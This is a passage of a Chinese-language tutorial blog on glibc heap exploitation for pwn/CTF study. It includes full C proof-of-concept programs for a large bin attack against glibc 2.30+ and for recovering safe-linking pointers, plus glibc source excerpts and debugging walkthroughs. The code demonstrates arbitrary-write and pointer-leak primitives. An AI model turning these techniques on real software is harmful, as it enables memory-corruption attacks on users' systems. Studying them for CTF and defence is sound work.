class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        <span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>可以看到，这种攻击手段并没有经过 <code>house of lore</code> 的需要经过的验证，即没有这一个要求 <code> bck-&gt;fd == victim</code>。</p>
<h3 id="调试-23"><a href="#调试-23" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015135526620.png"
                      alt="image-20231015135526620"
                ></p>
<p>目标地址的 <code>stack_var_bk == stack_var_fd</code>，为了后续将 <code>fake_chunk</code> 的 <code>bk</code> 指针指向一块可写的内存，绕过 <code>glibc</code> 在摘链表时候的检查，样例中我们在 <code>small_bin</code> 中摘取两个 <code>chunk</code> 放入 <code>tcache</code> ，<code>tcache</code>便已经满了，不会再去索取 <code>fake_chunk_bk</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140157626.png"
                      alt="image-20231015140157626"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140331259.png"
                      alt="image-20231015140331259"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140509323.png"
                      alt="image-20231015140509323"
                ></p>
<p>申请 <code>9</code> 个 <code>0x90</code> 大小的 <code>chunk</code>，将 <code>3~8</code> 这 <code>6</code> 个 <code>chunk</code> 放进 <code>tcache</code> 中， 然后依次释放 <code>1,0,2</code> 三个 <code>chunk</code>，<code>1</code> 将会进入 <code>tcache</code> 中，<code>0,2</code> 进入 <code>unsorted</code>，因为不相邻，所以不会触发合并。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140538358.png"
                      alt="image-20231015140538358"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140650996.png"
                      alt="image-20231015140650996"
                ></p>
<p><code>malloc(0xa0)</code> 将会触发整理机制，将 <code>unsorted_bin</code> 中的 <code>chunk</code> 放进 <code>small_bin</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140716845.png"
                      alt="image-20231015140716845"
                ></p>
<p>接下来在 <code>tcache</code> 中腾出两个位置，为后续放入 <code>small_bin chunk</code> 做准备。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140815350.png"
                      alt="image-20231015140815350"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140838808.png"
                      alt="image-20231015140838808"
                ></p>
<p>将 <code>small_bin</code> 中倒数第二个 <code>chunk_bk</code> 指向 <code>stack_var</code>，为后续将 <code>chunk</code> 放入 <code>tcache</code> 中做索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141053095.png"
                      alt="image-20231015141053095"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141310006.png"
                      alt="image-20231015141310006"
                ></p>
<p>利用 <code>calloc(1,0x90)</code> 将 <code>small_bin</code> 中最后一个 <code>chunk</code> 拿出来，然后触发整理机制，将 <code>small_bin</code> 中剩余的 <code>chunk</code> 倒序取出放入 <code>tcache</code>，也就是按 <code>bk</code> 去索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141338609.png"
                      alt="image-20231015141338609"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141353825.png"
                      alt="image-20231015141353825"
                ></p>
<p>此时再次申请将会把目标地址的<code>fake_chunk</code>申请出来。</p>
<h1 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h1><h2 id="large-bin-attack-glibc-2-29"><a href="#large-bin-attack-glibc-2-29" class="headerlink" title="large_bin_attack (glibc &gt; 2.29)"></a>large_bin_attack (glibc &gt; 2.29)</h2><p>本次使用 <code>ubuntu:20.04</code> 。</p>
<h3 id="源码-24"><a href="#源码-24" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>glibc-2.30</code> 新增了两道检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// largebin_chunk-&gt;bk_nextsize-&gt;fd_nextszie != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="comment">// largebin_chunk-&gt;bk-&gt;fd != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>利用代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-24"><a href="#调试-24" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015202953631.png"
                      alt="image-20231015202953631"
                ></p>
<p>布置堆结构如上，图中从上到下<code>chunk</code>分别为 <code>p1, g1, p2, g2</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203107725.png"
                      alt="image-20231015203107725"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203416086.png"
                      alt="image-20231015203416086"
                ></p>
<p>将 <code>chunk_p1</code> 放进 <code>largebin</code>，将 <code>chunk_p2</code> 放进 <code>unsorted_bin</code>，<code>(largebin)p1_size &gt; (unsorted)p2_size</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203720711.png"
                      alt="image-20231015203720711"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203842452.png"
                      alt="image-20231015203842452"
                ></p>
<p>修改<code>p1_bk_nextsize = target-0x20</code>，也就是<code>fake_chunk_fd_nextsize</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204330313.png"
                      alt="image-20231015204330313"
                ></p>
<p>然后申请 <code>0x438</code> 大小的 <code>chunk</code>，触发整理机制将 <code>chunk_p2</code> 链接进 <code>largebin</code>，因为 <code>p2_size &lt; (largebin_least)p1</code>，会触发如下代码。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// victim:p2, fwd:largebin表头, bck:largebin_least_chunk(p1)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk; </span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p><code>p2-&gt;fd_nextsize = p1; </code></p>
</li>
<li><p><code>p2-&gt;bk_nextsize = (target-0x20)p1-&gt;bk_nextsize;</code></p>
</li>
<li><p><code>(target-0x20)p1-&gt;bk_nextsize = p2;</code></p>
</li>
</ol>
<p> 第三步时将 <code>(target)fake_chunk_fd_nextsize</code> 改为了 <code>p2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204706099.png"
                      alt="image-20231015204706099"
                ></p>
<p>最后目标地址被成功修改为一个堆地址。</p>
<h2 id="decrypt-safe-linking-glibc-2-31"><a href="#decrypt-safe-linking-glibc-2-31" class="headerlink" title="decrypt_safe_linking(glibc &gt; 2.31)"></a>decrypt_safe_linking(glibc &gt; 2.31)</h2><p>本次使用 <code>ubuntu:22.04</code> 进行编译。</p>
<h3 id="源码-25"><a href="#源码-25" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">decrypt</span><span class="params">(<span class="type">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line">	<span class="type">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="type">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment">	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0.</span></span><br><span class="line"><span class="comment">	 * For demonstrations of other more general cases, plz refer to</span></span><br><span class="line"><span class="comment">	 * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="type">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="type">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 3: recover the values</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line">	<span class="type">long</span> plaintext = <span class="built_in">decrypt</span>(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">	<span class="built_in">assert</span>(plaintext == (<span class="type">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h3><p>对 <code>tcache_next(fd)</code> 新增检查:</p>
